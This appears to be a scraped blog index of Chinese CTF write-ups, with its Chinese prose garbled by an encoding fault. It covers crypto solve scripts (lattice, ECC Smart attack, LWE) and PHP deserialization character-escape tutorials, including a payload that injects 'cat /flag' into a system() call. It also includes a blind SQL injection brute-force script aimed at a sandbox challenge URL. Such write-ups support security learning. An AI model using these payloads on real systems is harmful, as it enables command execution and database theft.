(8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)# e = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688&quot;&quot;&quot;from sage.all import *from Crypto.Util.number import long_to_bytesh, q = (8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)e = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688M = Matrix(ZZ, [            [1, h],            [0, q]])for v in M.LLL():    f, g = v    a = e*f % q    m = a * inverse_mod(f, g) % g    if b&#x27;flag&#x27; in long_to_bytes(m):        print(long_to_bytes(m)&quot;&quot;&quot;m = 240545625414656445795697416299836828697587638044418742943136404284040669983557024929358783705357829768985339005print(long_to_bytes(m))\n\nSmart[å®˜æ–¹è§£]\nè€ƒç‚¹ï¼šECC Smart attackï¼ˆæ¤­åœ†æ›²çº¿trace of Frobenius &#x3D; 1çš„æƒ…å½¢ï¼‰\n\nFLAGï¼šflag{m1nd_y0ur_p4rameter#167d}\n\nè§£é¢˜æ­¥éª¤.\n\n\n&quot;&quot;&quot;è€ƒç‚¹ï¼šECC Smart attackï¼ˆæ¤­åœ†æ›²çº¿trace of Frobenius = 1çš„æƒ…å½¢ï¼‰FLAGï¼šflag&#123;m1nd_y0ur_p4rameter#167d&#125;# è§£é¢˜æ­¥éª¤&quot;&quot;&quot;from Crypto.Util.number import *from sage.all import *def lift_point(E, P):    R = P.base_ring()    x, y = map(ZZ, P.xy())    PP = E.lift_x(x, all=True)    for pt in PP:        _, yy = map(R, pt.xy())        if y == yy:            return ptp = 75206427479775622966537995406541077245842499523456803092204668034148875719001a = 40399280641537685263236367744605671534251002649301968428998107181223348036480b = 34830673418515139976377184302022321848201537906033092355749226925568830384464E = EllipticCurve(GF(p), [a, b])G = E(63199291976729017585116731422181573663076311513240158412108878460234764025898, 11977959928854309700611217102917186587242105343137383979364679606977824228558)P = E(75017275378438543246214954287362349176908042127439117734318700769768512624429, 39521483276009738115474714281626894361123804837783117725653243818498259351984)EE = E = EllipticCurve(Qp(p), [int(a) + p * ZZ.random_element(1, p) for a in E.a_invariants()])x, y = map(ZZ, P.xy())GG = lift_point(EE, G)PP = lift_point(EE, P)Gp = p * GGPp = p * PPGx, Gy = Gp.xy()Px, Py = Pp.xy()d = ZZ((Px / Py) / (Gx / Gy)) % p# d = 706900059475062772067312229965334421909675651947459433421022963709731965print(long_to_bytes(d))\n\nerror[å®˜æ–¹è§£]\nè€ƒç‚¹ lwe\n\nFLAGï¼šflag{try_lear1n_wi0h_t1e_error}\n\nè§£é¢˜æ­¥éª¤\n\n\n&quot;&quot;&quot;è€ƒç‚¹ lweFLAGï¼šflag&#123;try_lear1n_wi0h_t1e_error&#125;è§£é¢˜æ­¥éª¤&quot;&quot;&quot;import res2n=lambda x: [int(x) for x in re.findall(r&quot;\\-?\\d+\\.?\\d*&quot;,x)]f=open(&quot;./enc.out&quot;,&quot;r&quot;).readlines()m = 66n = 200p = 5q = 2^20B = [s2n(f[i]) for i in range(m)]A = [s2n(f[i+66]) for i in range(m)]C = [s2n(f[i+132]) for i in range(m)]# print(A)# print(B)# print(C)b= list(matrix(ZZ,s2n(f[-1])))m=A+B+C+bM = matrix(ZZ,m)L = M.LLL()print(L[0])res=M.solve_left(L[0])for i in res[:-1]:    print(chr(abs(i)),end=&quot;&quot;)\n\n\nå®˜æ–¹WriteUpï¼šhttps://shimo.im/docs/gXqmdVvbOEsXpo3o/\n\n","categories":["CTF","NewStar 2023"],"tags":["ctf","crypto","web"]},{"title":"PHPåºåˆ—åŒ–å­—ç¬¦é€ƒé€¸","url":"/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/","content":"ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æ­¤ç±»é¢˜ç›®çš„æœ¬è´¨å°±æ˜¯æ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´è¿™ç§é¢˜ç›®æœ‰ä¸ªå…±åŒç‚¹ï¼š\n\nphpåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç»è¿‡äº†æ›¿æ¢æˆ–è€…ä¿®æ”¹ï¼Œå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‘ç”Ÿå˜åŒ–ã€‚\næ€»æ˜¯å…ˆè¿›è¡Œåºåˆ—åŒ–ï¼Œå†è¿›è¡Œæ›¿æ¢ä¿®æ”¹æ“ä½œã€‚\n\n&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123;    public $name=&#x27;aaaa&#x27;;    public $pass=&#x27;123456&#x27;;&#125;$AA=new A();// echo serialize($AA).&quot;\\n&quot;;$res=filter(serialize($AA));$c=unserialize($res);echo $c-&gt;pass;?&gt;\n\nä»¥ä¸Šé¢ä»£ç ä¸ºä¾‹ï¼Œå¦‚ä½•åœ¨ä¸ç›´æ¥ä¿®æ”¹$passå€¼çš„æƒ…å†µä¸‹é—´æ¥ä¿®æ”¹$passçš„å€¼ã€‚è¿™æ®µä»£ç çš„æµç¨‹æ˜¯ï¼Œå…ˆåºåˆ—åŒ–ä»£ç ï¼Œç„¶åå°†é‡Œé¢ä¸å¸Œæœ›å‡ºç°çš„å­—ç¬¦bbæ›¿æ¢æˆè‡ªå®šä¹‰çš„å­—ç¬¦ä¸²cccã€‚ç„¶åè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åè¾“å‡ºpasså˜é‡ã€‚\nè¦è§£å†³ä¸Šé¢è¿™ä¸ªé—®é¢˜ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹phpåºåˆ—åŒ–ä»£ç çš„ç‰¹å¾ã€‚\nO:1:â€Aâ€:2:{s:4:â€nameâ€;s:4:â€aaaaâ€;s:4:â€passâ€;s:6:â€123456â€;}\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œååºåˆ—åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯ä»¥&quot;;&#125;ç»“æŸçš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æŠŠ&quot;;&#125;å¸¦å…¥éœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­ï¼ˆé™¤äº†ç»“å°¾å¤„ï¼‰ï¼Œå°±èƒ½è®©ååºåˆ—åŒ–æå‰é—­åˆç»“æŸï¼Œåé¢çš„å†…å®¹å°±ä¸¢å¼ƒäº†ã€‚åœ¨ååºåˆ—åŒ–çš„æ—¶å€™phpä¼šæ ¹æ®sæ‰€æŒ‡å®šçš„å­—ç¬¦é•¿åº¦å»è¯»å–åè¾¹çš„å­—ç¬¦ã€‚å¦‚æœæŒ‡å®šçš„é•¿åº¦sé”™è¯¯åˆ™ååºåˆ—åŒ–å°±ä¼šå¤±è´¥ã€‚\næ ¹æ®åˆšæ‰è®²çš„ï¼Œå¦‚æœæˆ‘ä»¬å°†nameå˜é‡ä¸­æ·»åŠ bbåˆ™ç¨‹åºå°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºbbå°†è¢«filterå‡½æ•°æ›¿æ¢æˆcccï¼Œcccçš„é•¿åº¦æ¯”bbå¤š1ï¼Œè¿™æ ·å‰é¢çš„sæ‰€ä»£è¡¨çš„é•¿åº¦ä¸º2ä½†æ˜¯å†…å®¹å´å˜é•¿äº†ï¼Œæˆäº†cccã€‚\n&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123;    public $name=&#x27;aaaabb&#x27;;    public $pass=&#x27;123456&#x27;;&#125;$AA=new A();// echo serialize($AA).&quot;\\n&quot;;$res=filter(serialize($AA));echo serialize($AA).&quot;\\n&quot;;$res = filter(serialize($AA));echo $res;$c=unserialize($res);echo $c-&gt;pass;?&gt;\n\n\n\nO:1:â€Aâ€:2:{s:4:â€nameâ€;s:6:â€aaaabbâ€;s:4:â€passâ€;s:6:â€123456â€;}\nO:1:â€Aâ€:2:{s:4:â€nameâ€;s:6:â€aaaacccâ€;s:4:â€passâ€;s:6:â€123456â€;}\nå¯è§åœ¨åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²åœ¨ç»è¿‡filterå‡½æ•°è¿‡æ»¤å‰ï¼Œsä¸º6ï¼Œå†…å®¹ä¸ºaaaabbï¼›ç»è¿‡filterè¿‡æ»¤åï¼Œsä»ç„¶ä¸º6ï¼Œä½†å†…å®¹å˜ä¸ºäº†aaaacccï¼Œé•¿åº¦å˜æˆäº†7ï¼Œæ ¹æ®ååºåˆ—åŒ–è¯»å–å˜é‡çš„åŸåˆ™æ¥è®²ï¼Œæ­¤æ—¶çš„nameèƒ½è¯»å–åˆ°çš„åªæ˜¯aaaaccï¼Œæœ«å°¾å¤„çš„é‚£ä¸ªcæ˜¯è¯»å–ä¸åˆ°çš„ï¼Œè¿™å°±å½¢æˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²çš„é€ƒé€¸ã€‚å½“æˆ‘ä»¬æ·»åŠ å¤šä¸ªbbï¼Œæ¯æ·»åŠ ä¸€ä¸ªbbæˆ‘ä»¬å°±èƒ½é€ƒé€¸ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£æˆ‘ä»¬å°†é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å¡«å……æˆæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„ä»£ç é•¿åº¦çš„è¯é‚£å°±å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–çš„ç»“æœä»¥åŠç±»é‡Œé¢çš„å˜é‡å€¼äº†ã€‚\nå‡å¦‚åœ¨nameå¤„æ”¹ä¸ºï¼š&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;\n&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123;    public $name=&#x27;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;;    public $pass=&#x27;123456&#x27;;&#125;$AA=new A();echo serialize($AA).&quot;\\n&quot;;$res = filter(serialize($AA));echo $res;$c=unserialize($res);echo $c-&gt;pass;?&gt;\n\nç”±äº$nameè¢«åºåˆ—åŒ–åçš„é•¿åº¦æ˜¯å›ºå®šçš„ï¼Œåœ¨ååºåˆ—åŒ–å$nameä»ç„¶ä¸º&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;ï¼Œ$passä»ç„¶ä¸º123456ï¼š\nO:1:â€Aâ€:2:{s:4:â€nameâ€;s:27:&quot;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:â€passâ€;s:6:â€123456â€;}\nå…³é”®ç‚¹åœ¨äºfilterå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ£€æµ‹å¹¶æ›¿æ¢äº†éæ³•å­—ç¬¦ä¸²ï¼Œçœ‹ä¼¼å¢åŠ äº†ä»£ç çš„å®‰å…¨ç³»æ•°ï¼Œå®åˆ™è®©æ•´æ®µä»£ç æ›´åŠ å±é™©ã€‚filterå‡½æ•°ä¸­æ£€æµ‹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ£€æµ‹åˆ°äº†éæ³•å­—ç¬¦â€™bbâ€™ï¼Œå°±æŠŠå®ƒæ›¿æ¢ä¸ºâ€™cccâ€™ã€‚æ­¤æ—¶æˆ‘ä»¬å‘ç°â€;s:4:â€passâ€;s:6:â€hackerâ€;}çš„é•¿åº¦ä¸º27ï¼Œå¦‚æœæˆ‘ä»¬å†åŠ ä¸Š27ä¸ªbbï¼Œé‚£æœ€ç»ˆçš„é•¿åº¦å°†å¢åŠ 27ï¼Œä¸å°±èƒ½é€ƒé€¸åé¢çš„â€;s:4:â€passâ€;s:6:â€hackerâ€;}äº†å—ï¼Ÿå¦‚ä¸‹ï¼š\n&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123;    public $name=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;;    public $pass=&#x27;123456&#x27;;&#125;$AA=new A();echo serialize($AA).&quot;\\n&quot;;$res = filter(serialize($AA));echo $res.&quot;\\n&quot;;$c=unserialize($res);print_r($c).&quot;\\n&quot;;echo $c-&gt;pass;?&gt;\n\nè¿è¡Œç»“æœï¼š\nO:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;A Object(    [name] =&gt; ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc    [pass] =&gt; hacker)hacker\n\næ­¤æ—¶ï¼ŒæˆåŠŸé€ƒé€¸ï¼Œä¿®æ”¹äº†passçš„å€¼\nå¡«å……çš„27ä¸ªbbï¼Œåœ¨ç»è¿‡filterå‡½æ•°è¿‡æ»¤åä¼šå¢åŠ 27ä¸ªå­—ç¬¦çš„é•¿åº¦ï¼Œè¿™27ä¸ªå­—ç¬¦ä¼šå¡«å……å½“å‰payloadå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œpayloadåˆ™é¡ºåˆ©çš„é€ƒé€¸å¤„äº†phpååºåˆ—åŒ–ä¸­sçš„æ£€æŸ¥\nè¢«é€ƒé€¸å‡ºçš„payloadä¼šè¢«å½“æˆå½“å‰ç±»çš„å±æ€§ç»§ç»­æ‰§è¡Œ&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;ï¼Œè€Œåä¸€éƒ¨åˆ†ç”±äºå‰é¢çš„payloadå·²ç»æ„æˆäº†é—­åˆï¼Œæ‰€ä»¥ä¸åœ¨æ‰§è¡Œ\n[NewStar2023 week4]é€ƒé¢˜ç›®ï¼š\n &lt;?phphighlight_file(__FILE__);function waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key;    public $cmd = &quot;whoami&quot;;    public function __construct($key)    &#123;        $this-&gt;key = $key;    &#125;    public function __destruct()    &#123;        system($this-&gt;cmd);    &#125;&#125;unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;])))); www-data www-data \n\nç»å…¸çš„phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸\né¦–å…ˆæ„é€ åºåˆ—åŒ–ä»£ç ï¼š\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;bad&#x27;;       public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;\n\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:3:&quot;bad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\næˆ‘ä»¬éœ€è¦é€ƒé€¸çš„æ˜¯&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;;      public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;\n\n\n\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:24:&quot;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\næ€»å…±24ä¸ªå­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬å†™24ä¸ªbadå°±è¡Œ\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;;      public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;$res = waf(serialize($a));echo $res.&quot;\\n&quot;;$c = unserialize($res);print_r($c).&quot;\\n&quot;;echo $c-&gt;cmd;\n\nè¿è¡Œç»“æœï¼š\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:96:&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:96:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;GetFlag Object(    [key] =&gt; goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood    [cmd] =&gt; ls /)ls /\n\npayloadï¼š\nkey = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot; \n\næ¥ç€æ„é€ payloadæŸ¥çœ‹flag\n/?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;\n\n","categories":["PHP"],"tags":["PHP","åºåˆ—åŒ–","ååºåˆ—åŒ–","å­—ç¬¦é€ƒé€¸"]},{"title":"PHPåºåˆ—åŒ–åŸºç¡€çŸ¥è¯†","url":"/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","content":"åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¦‚å¿µåºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²åŒ…æ‹¬ å±æ€§å å±æ€§å€¼ å±æ€§ç±»å‹å’Œè¯¥å¯¹è±¡å¯¹åº”çš„ç±»åã€‚ ååºåˆ—åŒ–åˆ™ç›¸åå°†å­—ç¬¦ä¸²é‡æ–°æ¢å¤æˆå¯¹è±¡ã€‚ å¯¹è±¡çš„åºåˆ—åŒ–åˆ©äºå¯¹è±¡çš„ä¿å­˜å’Œä¼ è¾“,ä¹Ÿå¯ä»¥è®©å¤šä¸ªæ–‡ä»¶å…±äº«å¯¹è±¡ã€‚\nåºåˆ—åŒ–ä¸­å¸¸è§çš„é­”æ³•å‡½æ•°ï¼š__construct() åˆ›å»ºå¯¹è±¡æ—¶è°ƒç”¨__destruct() é”€æ¯å¯¹è±¡æ—¶è°ƒç”¨__toString() å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ__wakeup å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨\n\n\nçœ‹ä¸€ä¸²å­—ç¬¦ä¸²O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;Oä»£è¡¨å¯¹è±¡ å› ä¸ºæˆ‘ä»¬åºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ åºåˆ—åŒ–æ•°ç»„åˆ™ç”¨Aæ¥è¡¨ç¤º3 ä»£è¡¨ç±»åå­—å ä¸‰ä¸ªå­—ç¬¦ ctf ç±»å3 ä»£è¡¨ä¸‰ä¸ªå±æ€§sä»£è¡¨å­—ç¬¦ä¸²4ä»£è¡¨å±æ€§åé•¿åº¦flagå±æ€§ås:13:&quot;flag&#123;abedyui&#125;&quot; å­—ç¬¦ä¸² å±æ€§å€¼é•¿åº¦ å±æ€§å€¼\n\nè®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦æ ¹æ®è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦çš„ä¸åŒ åºåˆ—åŒ–åçš„ å±æ€§é•¿åº¦å’Œå±æ€§å€¼ä¼šæœ‰æ‰€ä¸åŒ,æ‰€ä»¥è¿™é‡Œç®€å•æä¸€ä¸‹\npublic(å…¬æœ‰)protected(å—ä¿æŠ¤)private(ç§æœ‰çš„)protectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00*%00å±æ€§åprivateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00ç±»å%00å±æ€§å\n\nå°±åƒè¿™æ ·\nO:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;//è¿™é‡Œæ˜¯privateå±æ€§è¢«åºåˆ—åŒ–\n\nç»•è¿‡__wakeup()å‡½æ•°å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚\n//å°†ä¸Šé¢çš„å¯¹è±¡å±æ€§ä¸ªæ•°å€¼æ”¹æˆé€¼çœŸå®ä¸ªæ•°æ‰“O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;\n\n[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;\n\nå¾—åˆ°\nO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\nç»•è¿‡__wakeup\nO:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\nprivateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ%00ç±»å%00å±æ€§å,æ ¹æ®è§„åˆ™è¿›è¡Œä¿®æ”¹\nO:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;\n\nç„¶å?selectä¼ å€¼\n?select=O:4:&quot;Name&quot;:3&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;\n\nhttps://blog.csdn.net/weixin_45785288/article/details/109877324\n","categories":["PHP"],"tags":["åºåˆ—åŒ–","ååºåˆ—åŒ–","php"]},{"title":"WebsiteManger","url":"/WebsiteManger/","content":"2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-WebsiteManger\n\né¦–å…ˆf12æ£€æŸ¥æºæ–‡ä»¶ å‘ç°å›¾ç‰‡å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ ï¼š\n\n\nå¸ƒå°”ç›²æ³¨çŸ¥è¯†ç‚¹\n\n&#x2F;image.php?id&#x3D;if(1&#x3D;1,1,5)              True\n&#x2F;image.php?id&#x3D;if(1&#x3D;2,1,5)              False\n\nè§£é‡Š: æ¡ä»¶ä¸ºçœŸæ—¶?id=1ï¼Œå›æ˜¾ç¬¬ä¸€å¼ å›¾ç‰‡ï¼Œæ¡ä»¶ä¸ºå‡æ—¶?id=5ï¼Œæ²¡æœ‰id=5çš„å›¾ç‰‡ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚å³å¯ä½œä¸ºå¸ƒå°”ç›²æ³¨åˆ¤æ–­æ¡ä»¶\n\nè„šæœ¬æµ‹è¯•ï¼š\n\nimport requestsall_str = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;url = &#x27;http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php&#x27;info = &#x27;&#x27;for i in range(1, 50):    for s in all_str:        payload = &#x27;?id=if((ascii(mid(database(),&#123;&#125;,1))=&#123;&#125;),1,5)&#x27;.format(i, ord(s))        ans = requests.get(url=url + payload)        if len(ans.text) &gt; 1000:            info += s            print(payload)            print(info)\n\nä»¥ä¸Šåˆ¤æ–­å‡ºdatabase()=ctf\n\n\næ ¹æ®ç½‘ä¸Šwriteupæ¸…æ™°å¾—çŸ¥ï¼š\n\n#çˆ†ç ´æ•°æ®åº“payload = &#x27;?id=if((ascii(mid(database(),&#123;&#125;,1))=&#123;&#125;),1,5)&#x27;.format(i,ord(s))#çˆ†ç ´è¡¨åpayload = 